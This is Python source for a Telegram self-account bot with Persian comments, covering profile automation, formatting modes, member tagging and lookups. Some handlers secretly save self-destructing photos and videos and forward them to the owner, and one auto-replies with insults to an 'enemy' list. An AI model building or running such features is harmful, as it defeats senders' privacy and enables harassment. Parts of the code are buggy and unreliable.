# نسخه جدید دیباگ : 5
# صفر تا صد توسط @Camaeal دیباگ شده 
# اگه ننت خراب نیست اسکی میری منبع بزن

#تنها نسخه سالم و دیباگ در حال حاضر همین نسخه فقط اگه لازم داشتید خودتون api اضافه کنید برای هوش مصنوعی و ...
from colorama import Fore, init
from pyrogram import Client, filters, idle , errors ,enums
from pyrogram import raw
from telegraph import upload_file
from pyrogram.errors import ChatWriteForbidden
from threading import Timer
from html import escape
try:
    from thisapidoesnotexist import get_cat, get_person
except Exception:
    def get_cat():
        return None
    def get_person():
        return None
from aiohttp_helper import AioHttp
from random import randint
import re, sys, os, requests
from datetime import date,datetime
import jdatetime
import urllib
import traceback
import html
from countryinfo import CountryInfo
from currency_converter import CurrencyConverter
import random
import threading
import aiohttp
import asyncio
import shutil
import math
from bs4 import *
import requests
import base64
import logging
import importlib
from pyrogram.types import Message, ChatPermissions, ReplyKeyboardMarkup, InlineQueryResultArticle, \
    InputTextMessageContent, InlineKeyboardMarkup, InlineKeyboardButton as button, InlineQueryResultPhoto, CallbackQuery
from pyrogram.raw import functions , base , types
from pyrogram.raw.functions.auth import ResetAuthorizations
from pyrogram.raw.functions.contacts import GetBlocked
from pyrogram.raw.functions.messages import GetAllStickers
from requests import get as GET
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from wikipedia import search,page
from pytz import timezone
from translate import Translator
from datetime import date,datetime
from imdb import IMDb
import instagram_private_api as insta
from pyrogram.filters import create
from random import choice
import instagram_private_api as insta
from os import name
from plugins import ytinfo, ytdl, download_song, torb, song_YouTube, get_youtube_video, gif, logo, logo2, logo3, logo4, font, fosh_saz, love_saz, DLX,fontinname,create_time,create_time2,get_size,generateimage,snippet,read,write,if_not_exist_creat,run_codi,create_tarikh,moon_or_sun,love_emoji,fozolitime,fozolidate,json_read,dast_del,have_sec,write_a
from time import time
from gtts import gTTS
from ipapi import location
from socket import gethostbyname
from platform import python_version,uname
from urllib.request import Request
from uptime import uptime
from time import strftime, gmtime
from re import match,findall
from time import sleep
from qrcode import make
from psutil import virtual_memory,cpu_freq,cpu_percent,cpu_count
import psutil
from base64 import b64encode
from decimal import Decimal,getcontext
import json
import pytz
from io import StringIO
from requests import get as make_get_request
from bs4 import BeautifulSoup
from pySmartDL import SmartDL
import zipfile
from pyrogram.types import InputMediaPhoto
from PIL import Image, ImageDraw, ImageFont
from datetime import datetime
from pathlib import Path
from shutil import copyfile
from pyrogram import filters, Client 
from pyrogram.raw import functions
from pyrogram.enums import ChatType, UserStatus
from pyrogram.errors.exceptions.flood_420 import FloodWait
from io import BytesIO
import math
import shlex
from typing import Tuple
from pymediainfo import MediaInfo
import shlex
import textwrap
from typing import Tuple
from bs4 import BeautifulSoup as bs
from pyrogram import Client, emoji, filters
from pyrogram.enums import ParseMode
from pyrogram.errors import StickersetInvalid, YouBlockedUser
from pyrogram.raw.functions.messages import GetStickerSet
from pyrogram.raw.types import InputStickerSetShortName
from PIL import Image, ImageOps
import time
from pyrogram import ContinuePropagation
from pyrogram.errors import RPCError
from pyrogram.raw.functions.account import GetAuthorizations, ResetAuthorization
from pyrogram.raw.types import UpdateServiceNotification
from bs4 import BeautifulSoup
from typing import Union
from time import perf_counter
import pickle
from pyrogram.errors.exceptions.bad_request_400 import ChatNotModified
from pyrogram.types import ChatPermissions, Message

admin = sys.argv[1]
api_id = sys.argv[2]
api_hash = sys.argv[3]
bot_id = sys.argv[4]

profile_photo = "self/pfp/pfp.jpg"
os.chdir(os.path.dirname(os.path.abspath(__file__)))
os.chdir(os.path.dirname(os.path.abspath(__file__)))
users = []
my_users = []
users = filters.user(my_users)
enemy = []
love = []
fal = []
mutey = []
tabchitimer = []
imdb = IMDb()
mov_titles = [
    "long imdb title",
    "long imdb canonical title",
    "smart long imdb canonical title",
    "smart canonical title",
    "canonical title",
    "localized title",
]
def sizeof_fmt(num, suffix='B'):
    for unit in ['', 'K', 'M', 'G', 'T', 'P', 'E', 'Z']:
        if abs(num) < 1024.0:
            return "%3.1f %s%s" % (num, unit, suffix)
        num /= 1024.0
    return "%.1f %s%s" % (num, 'Y', suffix)

def get_cast(casttype, movie):
    mov_casttype = ""
    if casttype in list(movie.keys()):
        i = 0
        for j in movie[casttype]:
            if i < 1:
                mov_casttype += str(j)
            elif i < 5:
                mov_casttype += ", " + str(j)
            else:
                break
            i += 1
    else:
        mov_casttype += "Not Data"
    return mov_casttype


def get_moviecollections(movie):
    result = ""
    if "box office" in movie.keys():
        for i in movie["box office"].keys():
            result += f"\n•  <b>{i}:</b> <code>{movie['box office'][i]}</code>"
    else:
        result = "<code>No Data</code>"
    return result
moviepath = os.path.join(os.getcwd(), "temp", "moviethumb.jpg")

now = ""
galbe = ["🤍","🖤","🤎","💜","💙","💚","💛","🧡","❤️"]
ez_emoji = ["😀", "😃", "😄", "😁", "😆", "😅", "🗿", "🤣", "😭", "😗", "😙", "😚", "😘", "🥰", "😍", "🤩", "🥳", "🤗", "🙃", "🙂", "☺️", "😊", "😏", "😌", "😉", "🤭", "😶", "🤔", "🤪", "😜", "😝", "😛", "😋", "😔", "😑", "😐", "🤨", "🧐", "🙄", "😒", "😤", "😠", "😡", "🤬", "☹️", "😰", "🤫", "🤐", "😬", "😳", "🥺", "😟", "😕", "🙁", "😨", "😧", "😦", "😮", "😯", "😲", "😱", "🤯", "😢", "😥", "😓", "😞", "😣", "😖", "😩", "😫", "🤤", "🥱", "🤮", "😇", "😵", "🤥", "🤓", "😎", "🤑", "🤠"]
answer = []
javab = []
Src_vrsion = "V3.0"
#_________________________Create Files___________________________________
if not os.path.isfile("data.json"):
 with open("data.json" , "w") as fjr:
  fjr.write('{"limitDel": 4, "welcome": "off", "firstcom": "off", "timename": "off", "timename2": "off", "timebio": "off", "timebio2": "off", "timebio3": "off","timebio4": "off","timebio5": "off","timebio6": "off", "fontname": "off", "fuck": "off", "anti_del": "off", "autoan": "off", "boldmode": "off", "emojimode": "off", "underline": "off", "italicmode": "off", "codemode": "off", "strike": "off", "spoilermode": "off","quotemode": "off","pvlock": "off","typing": "off","mention": "off","monshi": "off","monshi2": "off"}')
  fjr.close() 
if not os.path.isfile("fucking.json"):
 with open("fucking.json" , "w") as fjr:
  fjr.write('{"fuck": "off"}')
  fjr.close() 
if_not_exist_creat("time.txt")
if_not_exist_creat("user.txt")
if_not_exist_creat("db.txt")
if_not_exist_creat("anti_del_chat.txt")
if_not_exist_creat("send_time_text.txt")
if_not_exist_creat("firstcommentmsg.txt")
if_not_exist_creat("welcome_add_text.txt")
if_not_exist_creat("playing.txt")
if_not_exist_creat("typing.txt")
if_not_exist_creat("RECORD_VIDEO.txt")
if_not_exist_creat("CHOOSE_STICKER.txt")
if_not_exist_creat("UPLOAD_VIDEO.txt")
if_not_exist_creat("UPLOAD_DOCUMENT.txt")
if_not_exist_creat("UPLOAD_AUDIO.txt")
if_not_exist_creat("SPEAKING.txt")
if_not_exist_creat("SPEAKING.txt")
if_not_exist_creat("timerpv.txt")
if_not_exist_creat("timergp.txt")
if_not_exist_creat("bannerpv.txt")
if_not_exist_creat("bannergp.txt")
if_not_exist_creat("bannersender.txt")
if_not_exist_creat("allplaying.txt")
if_not_exist_creat("alltyping.txt")
if_not_exist_creat("allRECORD_VIDEO.txt")
if_not_exist_creat("allCHOOSE_STICKER.txt")
if_not_exist_creat("allUPLOAD_VIDEO.txt")
if_not_exist_creat("allUPLOAD_DOCUMENT.txt")
if_not_exist_creat("allUPLOAD_AUDIO.txt")
if_not_exist_creat("allSPEAKING.txt")

#_________________________Client___________________________________
app = Client(f"../../sessions/{admin}", api_id, api_hash, device_model="Wenos-Self", system_version="Linux")
client = Client("Self", api_id, api_hash, device_model="Wenos-Self", system_version="Linux")

def mak():
 with app:
  m =  app.send_message("me" , ".").message_id
  app.delete_messages("me" , m) 

def job():
 a = json_read("data.json")
 jdatetime.set_locale('fa_IR')
 d = jdatetime.datetime.now().strftime("%a")
 if read("time.txt") != datetime.now(timezone("Asia/Tehran")).strftime("%H:%M"):
  try:
   if (a["timename"] == "on"):app.invoke(functions.account.UpdateProfile(last_name=f'{create_time()}'))
   if (a["timename2"] == "on"):app.invoke(functions.account.UpdateProfile(last_name=f'{create_time2()}'))
   if (a["timebio"] == "on"):app.invoke(functions.account.UpdateProfile(about=f'{read("userbio.txt")} {create_time()}'))
   if (a["timebio2"] == "on"):app.invoke(functions.account.UpdateProfile(about=f'{read("userbio.txt")} {create_time2()}'))
   if (a["timebio3"] == "on"):app.invoke(functions.account.UpdateProfile(about=f'{moon_or_sun()} | {read("userbio.txt")} | {create_time2()} | {create_tarikh()}'))
   if (a["timebio4"] == "on"):app.invoke(functions.account.UpdateProfile(about=f'{moon_or_sun()} | {read("userbio.txt")} | {create_time2()} | {create_tarikh()} | {d}'))
   if (a["timebio5"] == "on"):app.invoke(functions.account.UpdateProfile(about=f'{love_emoji()} | {read("userbio.txt")} | {create_time2()} | {create_tarikh()} | {d}'))
   if (a["timebio6"] == "on"):app.invoke(functions.account.UpdateProfile(about=f'فضولی شما در تاریخ {fozolidate()} در ساعت {fozolitime()} با موفقیت ثبت شد✅'))
   if (a["fontname"] == "on"):app.invoke(functions.account.UpdateProfile(first_name=f'{fontinname(read("user.txt"))}'))
  except :
   pass
  write("time.txt" , datetime.now(timezone("Asia/Tehran")).strftime("%H:%M"))

def antidelmember():
 a = json_read("data.json")
 chat_id_kiri = read("anti_del_chat.txt")
 if a["anti_del"] == "on":
  ban_konande = []
  band = []
  kok = []
  db = ""
  chif = app.get_chat_members(chat_id_kiri, filter=enums.ChatMembersFilter.BANNED)
  for i in chif:
   ban_konande.append(i.restricted_by.id)
   band.append(i.user.id)
  for b in ban_konande:
   kir = f"{b}:{ban_konande.count(b)}\n"
   if kir not in db:
    db += f"{b}:{ban_konande.count(b)}\n"   
    kok.append(b)
  write("db.txt", db)
  database = open("db.txt", "r")
  for k in range(1,len(kok)+1):
   kirkhar = database.readline().split(":")
   if int(kirkhar[1]) >= a['limitDel']: #default 4
    try:
      app.ban_chat_member(chat_id_kiri , kirkhar[0])
      app.send_message(chat_id_kiri , f'**i Banned: {kirkhar[0]}**\n Because He/She Banned Members Above limit\n\n        **WenosSelf**')
      for i in band:
        app.unban_chat_member(chat_id_kiri, i)
    except Exception as er:
      app.send_message("me" , f"❖ **ERROR** :\n(`{er}`)")
      
#(((((((((((((((((((((((((((((((((((((((((((((((()
@app.on_message(filters.photo , group=334)
async def onphoto(c: Client, m: Message) :
    try :
        if m.photo.ttl_seconds :
            rand = random.randint(1000, 9999999)
            local = f"downloads/photo-{rand}.png"
            await app.download_media(message=m, file_name=f"photo-{rand}.png")
            await app.send_photo(chat_id=admin, photo=local, caption=f"🔥 New timed image {m.photo.date} | time: {m.photo.ttl_seconds}s")
            os.remove(local)
    except :
        pass

@app.on_message(filters.video , group=335)
async def onvideo(c: Client, m: Message) :
    try :
        if m.video.ttl_seconds :
            rand = random.randint(1000, 9999999)
            local = f"downloads/video-{rand}.mp4"
            await app.download_media(message=m, file_name=f"video-{rand}.mp4")
            await app.send_video(chat_id=admin, video=local, caption=f"🔥 New timed video {m.video.date} | time: {m.video.ttl_seconds}s")
            os.remove(local)
    except :
        pass
    
@app.on_message(
    filters.command(["sshot", "ss"], ".") & filters.me)
async def screenshot(app, message: Message):
    await asyncio.gather(
        message.delete(),
        app.send(
            functions.messages.SendScreenshotNotification(
                peer=await app.resolve_peer(message.chat.id),
                reply_to_msg_id=0,
                random_id=app.rnd_id(),
            )
        ),
    )
    

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
async def edit_or_reply(message: Message, *args, **kwargs) -> Message:
    apa = (
        message.edit_text
        if bool(message.from_user and message.from_user.is_self or message.outgoing)
        else (message.reply_to_message or message).reply_text
    )
    return await apa(*args, **kwargs)


eor = edit_or_reply

__XOR = []
DIM = [(340, 400)]
FF =["cache/autopic-font-ubuntu.ttf","cache/font.ttf","cache/COMICATE.ttf","cache/ANDALAS.ttf","cache/froufrou.ttf","cache/fast99.ttf","cache/WIND CREEK Italic.ttf","cache/Paint Drops.ttf"]


async def _autopic(_, delay):
    while bool(__XOR):
        await asyncio.sleep(30)
        original = "cache/autopic-template.jpg"
        photo = "photos/pic.png"
        copyfile(original, photo)
        current_time = datetime.now().strftime(
            f'%H:%M \n %d-%m-%y'
        )
        img = Image.open(photo)
        drawn_text = ImageDraw.Draw(img)
        fnt = ImageFont.truetype(choice(FF), 40)
        drawn_text.text(choice(DIM), current_time, font=fnt, fill=(0, 0, 0))
        img.save(photo)
        try:
            async for pic in _.get_chat_photos("me", limit=1):
                await _.delete_profile_photos(pic.file_id)
                await asyncio.sleep(2)
            await _.set_profile_photo(photo=photo)
        except Exception as exc:
            print("Autopic Error: " + exc)
        finally:
            Path(photo).unlink()

#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
from pyrogram.types import (InlineQueryResultArticle, InputTextMessageContent,
                            InlineKeyboardMarkup, InlineKeyboardButton)
@app.on_message( filters.private , group=33)
async def actions1(app, message):
 text = message.text
 json_database = json_read("data.json")
 json_list = json_read("list.json")
 chat_id = message.chat.id
 if (json_database["pvlock"] == "on" and chat_id != admin):
    await message.delete()
 elif (json_database["monshi"] == "on" and chat_id != admin):
     if (json_list[f"{text}"]):
         ab = json_list[f"{text}"]
         await app.send_message(chat_id=chat_id,text=f"{ab}",reply_to_message_id=message.id)
 

async def check_membership(channel, user_id):
    try:
        member = await app.get_chat_member(channel, user_id)
        return True  # کاربر عضو است
    except Exception as e:
        return False  # کاربر عضو نیست

# رویداد برای بررسی پیام‌های ارسال شده توسط کاربر در پیوی

def extract_transaction_link(input_text):
    match = re.search(r'https://tronscan\.org/#/transaction/(.*)', input_text)
    if match:
        return match.group(1)
    else:
        return None
        
@app.on_message(filters.private, group=3344)
async def forward_to_channel(app, message):
    json_database = json_read("data.json")
    if json_database["monshi2"] == "on":
        user_id = message.chat.id
        if not await check_membership(channel_id, user_id):
            await message.reply_text(f"""سلام دوست عزیز،
**
برای ارتباط با من  عضو کانال زیر شوید:

{channel_id}
**
""")
            await message.delete()
        else:
        # اگر کاربر عضو کانال بود، انجام دستورات دیگر
            pass
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.incoming , group=333)       
async def mes(app, message):
    if message and message.chat.id in enemy:
        try:
            s = fosh_saz(text=".")
            await message.reply(s)
            await asyncio.sleep(1)
        except Exception as ssss:
            print()
    elif message and message.chat.id in love:
        try:
            l = ["❤️","💖","💝","💞","💕","💘","💗","💓"]
            lo = choice(l)
            s = love_saz(text=f"{lo}")
            await message.reply(s)
            await asyncio.sleep(1)
        except Exception as ssss:
            print(ssss)
    elif message and message.chat.id in mutey:
        try:
            await app.delete_messages(message.chat.id , message.id)
        except :
            pass
        

#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(
    filters.command(["autopic"], ".") & filters.me)

async def autopic_zaid(_, m):
    global __XOR
    arc = await eor(m, "...")
    if bool(__XOR):
        __XOR[0].cancel()
        t = "`Autopic Stopped Successfully.`"
        __XOR.clear()
    else:
        _task = _autopic(_, delay=40)
        task = asyncio.create_task(_task)
        __XOR.append(task)
        t = "`Started Autopic.`"
    await arc.edit_text(t)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
__XOR2 = []
DIM2 = [(168, 85)]
FF2 =["cache/autopic-font-ubuntu.ttf","cache/font.ttf","cache/COMICATE.ttf","cache/ANDALAS.ttf","cache/froufrou.ttf","cache/fast99.ttf","cache/WIND CREEK Italic.ttf","cache/Paint Drops.ttf"]
CO =["#0d0552","#ab0909","#05fafa","#fab005"]

async def _autopic2(_, delay):
    while bool(__XOR2):
        await asyncio.sleep(30)
        original = "cache/1.jpg"
        photo = "pic.png"
        copyfile(original, photo)
        current_time = datetime.now().strftime(
            f'%H:%M \n %d-%m-%y'
        )
        img = Image.open(photo)
        drawn_text = ImageDraw.Draw(img)
        fnt = ImageFont.truetype(choice(FF2), 47)
        drawn_text.text(choice(DIM2), current_time, font=fnt, fill=choice(CO))
        img.save(photo)
        try:
            async for pic in _.get_chat_photos("me", limit=1):
                await _.delete_profile_photos(pic.file_id)
                await asyncio.sleep(2)
            await _.set_profile_photo(photo=photo)
        except Exception as exc:
            print("2Autopic Error: " + exc)
        finally:
            Path(photo).unlink()


@app.on_message(
    filters.command(["2autopic"], ".") & filters.me)

async def autopic_zaid(_, m):
    global __XOR2
    arc = await eor(m, "...")
    if bool(__XOR2):
        __XOR2[0].cancel()
        t = "`2Autopic Stopped Successfully.`"
        __XOR2.clear()
    else:
        _task = _autopic2(_, delay=40)
        task = asyncio.create_task(_task)
        __XOR2.append(task)
        t = "`Started 2Autopic.`"
    await arc.edit_text(t)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
__XOR3 = []
DIM3 = [(220, 85)]


async def _autopic3(_, delay):
    while bool(__XOR3):
        await asyncio.sleep(30)
        original = "cache/bat.jpg"
        photo = "pic.png"
        copyfile(original, photo)
        current_time = datetime.now().strftime(
            f'%H:%M \n %d-%m-%y'
        )
        img = Image.open(photo)
        drawn_text = ImageDraw.Draw(img)
        fnt = ImageFont.truetype("cache/bat.ttf", 34)
        drawn_text.text(choice(DIM3), current_time, font=fnt, fill=(255, 192, 203))
        img.save(photo)
        try:
            async for pic in _.get_chat_photos("me", limit=1):
                await _.delete_profile_photos(pic.file_id)
                await asyncio.sleep(2)
            await _.set_profile_photo(photo=photo)
        except Exception as exc:
            print("3Autopic Error: " + exc)
        finally:
            Path(photo).unlink()


@app.on_message(
    filters.command(["3autopic"], ".") & filters.me)

async def autopic_zaid(_, m):
    global __XOR3
    arc = await eor(m, "...")
    if bool(__XOR3):
        __XOR3[0].cancel()
        t = "`3Autopic Stopped Successfully.`"
        __XOR3.clear()
    else:
        _task = _autopic3(_, delay=40)
        task = asyncio.create_task(_task)
        __XOR3.append(task)
        t = "`Started 3Autopic.`"
    await arc.edit_text(t)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
__XOR4 = []
DIM4 = [(64, 100)]


async def _autopic4(_, delay):
    while bool(__XOR4):
        await asyncio.sleep(30)
        original = "cache/wiz.jpg"
        photo = "pic.png"
        copyfile(original, photo)
        current_time = datetime.now().strftime(
            f'%H:%M \n %d-%m-%y'
        )
        img = Image.open(photo)
        drawn_text = ImageDraw.Draw(img)
        fnt = ImageFont.truetype("cache/wiz.ttf", 40)
        drawn_text.text(choice(DIM4), current_time, font=fnt, fill="#008080")
        img.save(photo)
        try:
            async for pic in _.get_chat_photos("me", limit=1):
                await _.delete_profile_photos(pic.file_id)
                await asyncio.sleep(2)
            await _.set_profile_photo(photo=photo)
        except Exception as exc:
            print("3Autopic Error: " + exc)
        finally:
            Path(photo).unlink()


@app.on_message(
    filters.command(["4autopic"], ".") & filters.me)

async def autopic_zaid(_, m):
    global __XOR4
    arc = await eor(m, "...")
    if bool(__XOR4):
        __XOR4[0].cancel()
        t = "`4Autopic Stopped Successfully.`"
        __XOR4.clear()
    else:
        _task = _autopic4(_, delay=40)
        task = asyncio.create_task(_task)
        __XOR4.append(task)
        t = "`Started 4Autopic.`"
    await arc.edit_text(t)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
spam_chats = []
def get_arg(message: Message):
    msg = message.text
    msg = msg.replace(" ", "", 1) if msg[1] == " " else msg
    split = msg[1:].replace("\n", " \n").split(" ")
    if " ".join(split[1:]).strip() == "":
        return ""
    return " ".join(split[1:])

@app.on_message(filters.command("tagall", ".") & filters.me)
async def mentionall(app, message: Message):
    chat_id = message.chat.id
    direp = message.reply_to_message
    args = get_arg(message)
    if not direp and not args:
        return await message.edit("**Send me a message or reply to a message!**")
    await message.delete()
    spam_chats.append(chat_id)
    usrnum = 0
    usrtxt = ""
    async for usr in app.get_chat_members(chat_id):
        if not chat_id in spam_chats:
            break
        usrnum += 1
        usrtxt += f"[{usr.user.first_name}](tg://user?id={usr.user.id})✧ "
        if usrnum == 13:
            if args:
                txt = f"{args}\n\n{usrtxt}"
                await app.send_message(chat_id, txt)
            elif direp:
                await direp.reply(usrtxt)
            sleep(1)
            usrnum = 0
            usrtxt = ""
    try:
        spam_chats.remove(chat_id)
    except:
        pass


@app.on_message(filters.command("cancel", ".") & filters.me)
async def cancel_spam(app, message: Message):
    if not message.chat.id in spam_chats:
        return await message.edit("**It seems there is no tagall here.**")
    else:
        try:
            spam_chats.remove(message.chat.id)
        except:
            pass
        return await message.edit("**Cancelled.**")
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["unsplash"], ".") & filters.me)
async def unsplash_pictures(app, message: Message):
    cmd = message.command

    if len(cmd) > 1 and isinstance(cmd[1], str):
        keyword = cmd[1]

        if len(cmd) > 2 and int(cmd[2]) < 10:
            await message.edit("```Getting Pictures```")
            count = int(cmd[2])
            images = []
            while len(images) is not count:
                img = await AioHttp().get_url(
                    f"https://source.unsplash.com/1600x900/?{keyword}"
                )
                if img not in images:
                    images.append(img)

            for img in images:
                await app.send_photo(message.chat.id, str(img))

            await message.delete()
            return
        else:
            await message.edit("```Getting Picture```")
            img = await AioHttp().get_url(
                f"https://source.unsplash.com/1600x900/?{keyword}"
            )
            await asyncio.gather(
                message.delete(), 
                app.send_photo(message.chat.id, str(img))
            )

#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
json_database = json_read("data.json")
@app.on_message(filters.me & filters.command([".restart","restart","reset"] , "."), group=16)
def reset(app, m: Message):
    app.send_message(m.chat.id ,"**Self Restart was successful**", reply_to_message_id=m.id)
    python = sys.executable
    os.execl(python, python, *sys.argv)
    
@app.on_message(filters.me & filters.command(["ریس","ریست","ریستارت","ریسیت","restart","reset"], ""), group=16)
def reset(app, m: Message):
    app.send_message(m.chat.id, "**Self Restart was successful**", reply_to_message_id=m.id)
    python = sys.executable
    os.execl(python, python, *sys.argv)
    
@app.on_message(filters.me & filters.regex(f'^(.ment)'), group=80)
def ment(app, m: Message):
  if m.text.split()[1] == "on":
   json_database.update({"mention":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❋ Mention Mode is **ON**")
  elif m.text.split()[1] == "off":
   json_database.update({"mention":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❋ Mention Mode is **OFF**")
@app.on_message(filters.me & filters.regex(f'^(.bold)'), group=81)
def bold(app, m: Message):
  if m.text.split()[1] == "on":
   json_database.update({"boldmode":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Bold Mode is **ON**")
  elif m.text.split()[1] == "off":
   json_database.update({"boldmode":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Bold Mode is **OFF**")
@app.on_message(filters.me & filters.regex(f'^(.spoiler)'), group=82)
def spoiler(app, m: Message):
  if m.text.split()[1] == "on":
   json_database.update({"spoilermode":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Spoiler Mode is **ON**")
  elif m.text.split()[1] == "off":
   json_database.update({"spoilermode":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ spoiler Mode is **OFF**")
@app.on_message(filters.me & filters.regex(f'^(.quote)'), group=82)
def quote(app, m: Message):
  if m.text.split()[1] == "on":
   json_database.update({"quotemode":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ quote Mode is **ON**")
  elif m.text.split()[1] == "off":
   json_database.update({"quotemode":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ quote Mode is **OFF**")
@app.on_message(filters.me & filters.regex(f'^(.italic)'), group=83)
def italic(app, m: Message):
  if m.text.split()[1] == "on":
   json_database.update({"italicmode":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ italic Mode is **ON**")
  elif m.text.split()[1] == "off":
   json_database.update({"italicmode":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ italic Mode is **OFF**")
@app.on_message(filters.me & filters.regex(f'^(.code)'), group=84)
def code(app, m: Message):
  if m.text.split()[1] == "on":
   json_database.update({"codemode":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Code Mode is **ON**")
  elif m.text.split()[1] == "off":
   json_database.update({"codemode":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Code Mode is **OFF**")
@app.on_message(filters.me & filters.regex(f'^(.strike)'), group=85)
def strike(app, m: Message):
  if m.text.split()[1] == "on":
   json_database.update({"strike":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Strike Mode is **ON**")
  elif m.text.split()[1] == "off":
   json_database.update({"strike":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Strike Mode is **OFF**")
@app.on_message(filters.me & filters.regex(f'^(.underline)'), group=86)
def underline(app, m: Message):
  if m.text.split()[1] == "on":
   json_database.update({"underline":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Underline Mode is **ON**")
  elif m.text.split()[1] == "off": 
   json_database.update({"underline":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Underline Mode is **OFF**")
@app.on_message(filters.command(["emoji"], "."), group=87)
def emoji2(app, m: Message):
  if m.text.split()[1] == "on":
   json_database.update({"emojimode":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Emoji Mode is **ON**")
  elif m.text.split()[1] == "off":
   json_database.update({"emojimode":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❖ Emoji Mode is **OFF**")
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
@app.on_message(filters.me & filters.regex(f'^(.limit)'), group=15)
def spamban(app, m: Message):
    app.unblock_user("SpamBot")
    response = app.send_message("spambot" , f"/start")
    wait = app.send_message(m.chat.id, "در حال بررسی وضعیت اکانت شما...")
    sleep(3)
    spambot_msg = response.id + 1
    status = app.get_messages(chat_id="SpamBot", message_ids=spambot_msg)
    wait.delete()
    app.send_message(m.chat.id, f"**STATUS**▬▬▬▬▬▬▬▬▬▬\n `{status.text}`\n▬▬▬▬▬▬▬▬▬▬**STATUS**", reply_to_message_id=m.id)
    
@app.on_message(filters.me & filters.regex(f'^(.creation)'), group=17)
def spamban(app, m: Message):
    app.unblock_user("creationdatebot")
    response = app.send_message("creationdatebot" , f"check")
    sleep(3)
    spambot_msg = response.id + 1
    status = app.get_messages(chat_id="creationdatebot", message_ids=spambot_msg)
    app.send_message(m.chat.id, f"**STATUS**▬▬▬▬▬▬▬▬▬▬\n `{status.text}`\n▬▬▬▬▬▬▬▬▬▬**STATUS**", reply_to_message_id=m.id)
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
@app.on_message(filters.command(["weather", "w"], ".") & filters.me)
async def get_weather(app, m: Message):
    location = m.command[1]
    headers = {"user-agent": "httpie"}
    url = f"https://wttr.in/{location}?mnTC0&lang=en"
    try:
        # ایجاد جلسه async به جای with block جلسه
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url) as resp:
                data = await resp.text()
        weather = f"**WEATHER**▬▬▬▬▬▬▬▬▬▬\n{escape(data.replace('report', 'Report'))}\n▬▬▬▬▬▬▬▬▬▬**WEATHER**"
        await app.send_message(m.chat.id,weather, parse_mode=enums.ParseMode.MARKDOWN, reply_to_message_id=m.id)
    except Exception as er:
        await app.send_message("me", f"❖ ERROR :\n({er})")
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
# colour code to generate images
COLOUR_CODE = {
    "aqua": "rgba(0, 255, 255, 100)",
    "red": "rgba(255, 0, 0, 100)",
    "blue": "rgba(0, 0, 255, 100)",
    "green": "rgba(0, 255, 0, 100)",
    "yellow": "rgba(255, 255, 0, 100)",
    "gold": "rgba(255, 215, 0, 100)",
    "orange": "rgba(255, 165, 0, 100)",
    "purple": "rgba(41, 5, 68, 100)",
    "black": "rgba(0, 0, 0, 100)",
    "white": "rgba(255, 255, 255, 100)",
}
        
@app.on_message(filters.command(["colour", "color"], ".") & filters.me)
async def colourtemplate_handler(_, m: Message):
                picname = f"colour_image.png"
                img = Image.new("RGB", (60, 30), color=f"{m.command[1]}")
                img.save(picname)
                await app.send_photo(m.chat.id, picname, reply_to_message_id=m.id
                )
                os.remove(picname)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["snd"], ".") & filters.me)
async def self_destruct(app , m: Message):
    input_str = m.text.split(None, 1)[1]
    rm = await m.edit_text("`Meking self-destruct msg...`")
    ttl = 0
    if input_str:
        if "=" in input_str:
            msg, ttl = input_str.split("|")
        else:
            await m.reply_text("__Check help to know how to use__")
            return
        sd_msg = await m.reply_text(f"{msg}", reply_to_message_id=ReplyCheck(m))
        await rm.delete()
        await asyncio.sleep(int(ttl))
        await sd_msg.delete()
    else:
        await m.edit_text("__Check help to know how to use__")
        return
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["write"], ".") & filters.me)
async def write1(_, message):
    if len(message.command) < 2:
